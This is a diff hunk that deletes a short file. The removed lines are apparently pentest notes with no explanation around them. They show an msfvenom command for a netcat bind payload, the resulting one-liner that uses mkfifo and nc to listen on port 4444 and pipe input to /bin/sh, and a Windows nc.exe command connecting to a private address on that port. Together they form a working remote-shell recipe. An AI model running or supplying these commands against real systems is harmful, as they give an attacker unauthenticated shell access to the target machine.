@@ -1,9 +1,0 @@
-
-msfvenom.bat -p cmd/unix/bind_netcat
-
-mkfifo /tmp/avbyn; (nc -l -p 4444 ||nc -l 4444)0</tmp/avbyn | /bin/sh >/tmp/avbyn 2>&1; rm /tmp/avbyn
-
-nc.exe 192.168.138.141 4444
-
-
-
